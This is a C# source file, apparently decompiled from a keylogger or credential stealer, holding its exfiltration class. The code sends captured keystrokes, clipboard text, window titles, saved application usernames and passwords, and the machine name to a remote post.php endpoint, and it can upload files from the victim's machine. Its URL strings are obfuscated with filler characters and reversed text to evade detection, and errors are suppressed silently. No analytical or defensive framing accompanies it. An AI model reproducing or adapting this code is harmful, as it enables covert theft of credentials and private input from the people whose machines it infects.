using System;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

internal class Send
{
	public static void SendLog(string Link, string LogType, string WindowTitle, string KeystrokesTyped, string Application, string Host, string Username, string Password, string ClipboardText)
	{
		try
		{
			WebClient webClient = new WebClient();
			if (Operators.CompareString(LogType, "Keystrokes", false) == 0)
			{
				webClient.DownloadString(Link + "$pos$t$.$ph$p$?$ty$p$e$=$k$eys$tro$ke$s$&$mac$hi$ne$na$me$=$".Replace("$", "") + Get_Comp() + "&windowtitle=" + WindowTitle + "&keystrokestyped=" + KeystrokesTyped + Strings.StrReverse("=emitenihcam&") + DateAndTime.get_Now().ToShortTimeString());
			}
			else if (Operators.CompareString(LogType, Strings.StrReverse("sdrowssaP"), false) == 0)
			{
				webClient.DownloadString(Link + "#po#st.#ph#p?#typ#e=p#assw#ords#&mach#inen#ame=#".Replace("#", "") + Get_Comp() + "&application=" + Application + "&link=" + Host + "&username=" + Username + Strings.StrReverse("=drowssap&") + Password);
			}
			else if (Operators.CompareString(LogType, Strings.StrReverse("draobpilC"), false) == 0)
			{
				webClient.DownloadString(Link + "$po$st$.$ph$p$?$ty$pe$=$cl$ip$boa$rd&$mac$hine$nam$e=$".Replace("$", "") + Get_Comp() + "&windowtitle=" + WindowTitle + "&clipboardtext=" + ClipboardText + Strings.StrReverse("=emitenihcam&") + DateAndTime.get_Now().ToShortTimeString());
			}
			else if (Operators.CompareString(LogType, "Screenshot", false) != 0 && Operators.CompareString(LogType, "Notification", false) == 0)
			{
				webClient.DownloadString(Link + "$pos$t.$p$hp$?$typ$e=$not$ific$a$tion$&$mac$h$in$e$n$a$m$e$=$".Replace("$", "") + Get_Comp() + Strings.StrReverse("=emitenihcam&") + DateAndTime.get_Now().ToShortTimeString());
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string Get_Comp()
	{
		return Environment.MachineName;
	}

	public static void UploadFile(string Link, string Path)
	{
		try
		{
			WebClient webClient = new WebClient();
			byte[] bytes = webClient.UploadFile(Link, Path);
			Encoding.UTF8.GetString(bytes);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string Program_data(string a)
	{
		return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), a);
	}

	public static string Clip_Text()
	{
		return Clipboard.GetText();
	}
}
